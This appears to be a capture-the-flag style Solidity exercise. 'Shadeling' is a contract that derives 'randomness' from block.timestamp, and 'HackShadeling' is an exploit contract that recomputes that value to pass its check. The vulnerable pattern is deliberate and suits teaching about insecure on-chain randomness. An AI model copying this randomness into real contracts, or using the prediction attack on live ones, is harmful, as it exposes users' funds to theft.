// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Shadeling {
    bool public isPredicted;

    function predict(bytes32 x) external {
        require(x == _random());
        isPredicted = true;
    }

    function _random() internal view returns (bytes32) {
        return keccak256(abi.encode(block.timestamp));
    }
}

contract HackShadeling {

    Shadeling public shadelingAddr;
    constructor(address _shadeling) {
        shadelingAddr = Shadeling(_shadeling);
    }

    function hack() public {
        bytes32 randomVal = keccak256(abi.encode(block.timestamp));
        shadelingAddr.predict(randomVal);
    }
}